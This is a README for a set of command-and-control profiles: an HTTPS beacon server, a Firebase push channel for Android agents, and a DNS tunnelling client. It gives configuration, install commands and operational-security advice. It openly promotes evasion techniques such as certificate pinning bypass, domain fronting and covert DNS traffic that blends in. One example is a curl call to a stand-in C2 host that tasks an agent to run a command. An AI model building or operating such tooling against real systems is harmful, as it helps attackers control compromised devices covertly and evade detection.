# C2 Communication Profiles

This directory contains three distinct Command and Control (C2) communication profiles designed for various operational scenarios. Each profile implements different communication methods, encoding schemes, and operational security features.

## Overview

The three C2 profiles are:

1. **HTTPS Beacon Profile** - Traditional HTTP(S) beacon with mobile user-agent rotation
2. **FCM Push Profile** - Firebase Cloud Messaging for push-based commands  
3. **DNS Covert Channel** - DNS tunneling with advanced encoding and obfuscation

## 1. HTTPS Beacon Profile (`https_beacon/`)

### Description
A robust HTTP(S)-based C2 profile featuring async communication, mobile user-agent rotation, certificate pinning bypass capabilities, and priority-based task queuing.

### Features
- **Async HTTP Communication**: Built on aiohttp for high-performance async operations
- **Mobile User-Agent Rotation**: Rotates between authentic mobile browser user agents every 5 minutes
- **Certificate Pinning Bypass**: SSL context configuration to support pinning bypass techniques
- **Priority Task Queue**: Four-tier priority system (LOW, NORMAL, HIGH, CRITICAL)
- **CORS Support**: Full cross-origin support for mobile web applications
- **Operational Security**: Jittered beacon intervals, cache control headers

### Key Components
- `c2_server.py` - Main server implementation
- `requirements.txt` - Python dependencies
- Task priority handling with automatic expiration
- Agent status tracking and health monitoring

### Configuration
```python
config = {
    "host": "0.0.0.0",
    "port": 8443,
    "ssl_cert": "cert.pem",
    "ssl_key": "key.pem"
}
```

### API Endpoints
- `POST /beacon` - Agent check-in and task retrieval
- `POST /task` - Task result submission
- `GET /health` - Health check endpoint
- `POST /admin/task` - Administrative task creation
- `GET /admin/agents` - Active agent listing

## 2. FCM Push Profile (`fcm_push/`)

### Description
Firebase Cloud Messaging integration enabling push-based command delivery with wake-lock support for reliable background execution and automatic fallback to polling mode.

### Features
- **Firebase Integration**: Full FCM support for real-time push notifications
- **Wake-Lock Management**: Android power management for background execution
- **Fallback Polling**: Automatic fallback when FCM is unavailable
- **Message Priority**: Low, Normal, High priority levels with appropriate notification handling
- **Background Execution**: Maintains operation during device sleep/background states
- **Multi-Channel Support**: Hybrid approach combining push and polling

### Key Components
- `fcm_c2.py` - Main client implementation
- `requirements.txt` - Dependencies including Firebase Admin SDK
- Android-specific wake lock management
- Broadcast receiver for FCM message handling

### Configuration
```python
config = {
    "agent_id": "unique_agent_id",
    "fcm_token": "firebase_token",
    "server_url": "https://c2.example.com",
    "firebase_service_account": "path/to/service-account.json",
    "poll_interval": 30
}
```

### Message Flow
1. Agent registers FCM token with C2 server
2. Server sends commands via FCM push notifications
3. Client processes commands with wake-lock protection
4. Fallback polling activated if FCM fails
5. Results sent back via HTTP API

## 3. DNS Covert Channel (`dns_covert/`)

### Description
Advanced DNS tunneling implementation with Base32 encoding, chunked data transfer, and DNS-over-HTTPS support for highly covert communications that blend with normal DNS traffic.

### Features
- **DNS Tunneling**: Embed C2 communications in legitimate DNS queries
- **Multiple Encoding Options**: Base32, Base64, Hex encoding support
- **Chunked Data Transfer**: Automatic data segmentation for large payloads
- **DNS-over-HTTPS Support**: Multiple DoH providers (Cloudflare, Google, Quad9)
- **Data Compression**: Automatic compression to minimize DNS queries
- **Operational Diversity**: Random jitter and query timing variation

### Key Components
- `dns_tunnel.py` - Main client implementation
- `requirements.txt` - DNS and HTTP dependencies
- Advanced DNS query name encoding
- Multi-provider DNS-over-HTTPS support

### Configuration
```python
config = {
    "domain": "c2tunnel.example.com",
    "agent_id": "unique_agent_id", 
    "encoding": "base32",
    "channel": "https",
    "doh_provider": "cloudflare",
    "chunk_size": 180,
    "poll_interval": 45
}
```

### DNS Query Format
```
{packet_id}.{seq}.{total}.{encoded_data}.{subdomain}.{domain}
```

### Supported DNS Channels
- **UDP**: Direct UDP DNS queries
- **TCP**: TCP-based DNS queries  
- **HTTPS**: DNS-over-HTTPS (DoH)
- **TLS**: DNS-over-TLS (DoT) [planned]

## Installation & Dependencies

### HTTPS Beacon Profile
```bash
cd c2_profiles/https_beacon/
pip install -r requirements.txt
python c2_server.py
```

### FCM Push Profile
```bash
cd c2_profiles/fcm_push/
pip install -r requirements.txt
# Configure Firebase service account
python fcm_c2.py
```

### DNS Covert Channel  
```bash
cd c2_profiles/dns_covert/
pip install -r requirements.txt
python dns_tunnel.py
```

## Operational Security Considerations

### HTTPS Beacon
- Use legitimate SSL certificates
- Implement domain fronting where possible
- Rotate user agents regularly
- Monitor for certificate pinning detection
- Use jittered beacon intervals

### FCM Push
- Register legitimate FCM project
- Use authentic notification channels
- Implement proper wake-lock management
- Monitor battery optimization settings
- Fallback to polling if FCM blocked

### DNS Covert Channel
- Use legitimate domain registrations
- Implement query timing variation
- Monitor DNS query patterns
- Use multiple DoH providers
- Compress data to minimize queries

## Security Features

### Encryption & Encoding
- All profiles support data compression
- Multiple encoding schemes available
- SSL/TLS encryption for HTTP profiles
- DNS tunneling obfuscation techniques

### Evasion Capabilities
- Mobile user-agent rotation (HTTPS)
- Certificate pinning bypass (HTTPS)  
- Wake-lock management (FCM)
- DNS query pattern obfuscation (DNS)
- Multi-provider failover (DNS)

### Operational Diversity
- Multiple communication channels
- Priority-based task handling
- Automatic fallback mechanisms
- Configurable timing parameters
- Health monitoring and reporting

## Usage Examples

### HTTPS Beacon - Adding High Priority Task
```bash
curl -X POST https://c2.example.com/admin/task \
  -H "Content-Type: application/json" \
  -d '{
    "command": "execute",
    "payload": {"cmd": "whoami"},
    "priority": "HIGH",
    "agent_id": "specific_agent"
  }'
```

### FCM Push - Broadcast Message
```python
message = C2Message(
    message_id=str(uuid.uuid4()),
    command="system_info",
    payload={},
    priority=MessagePriority.NORMAL,
    channel_type=ChannelType.FCM_PUSH,
    timestamp=time.time()
)
await fcm_handler.send_multicast_message(message, tokens)
```

### DNS Covert - Query Generation
```python
data = {"command": "ping", "timestamp": time.time()}
json_data = json.dumps(data).encode()
packets = chunker.chunk_data(json_data, DataEncoding.BASE32)
```

## Troubleshooting

### Common Issues

1. **SSL Certificate Errors (HTTPS)**
   - Ensure cert.pem and key.pem are in the correct directory
   - Verify certificate validity and chain
   - Check SSL context configuration

2. **FCM Token Issues**
   - Verify Firebase project configuration
   - Check service account permissions
   - Ensure FCM token registration

3. **DNS Resolution Failures**
   - Verify domain registration and DNS settings
   - Check DoH provider availability
   - Test DNS query encoding/decoding

### Debugging Options

Enable debug logging:
```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

Monitor network traffic:
```bash
tcpdump -i any host c2.example.com
```

## Future Enhancements

### Planned Features
- WebSocket support for HTTPS profile
- iOS push notification support for FCM profile  
- DNS-over-TLS support for covert channel
- Enhanced evasion techniques
- Performance optimizations
- Additional encoding schemes

### Contributing
See project guidelines for contributing to C2 profile development.

## License
See project license for usage terms and conditions.
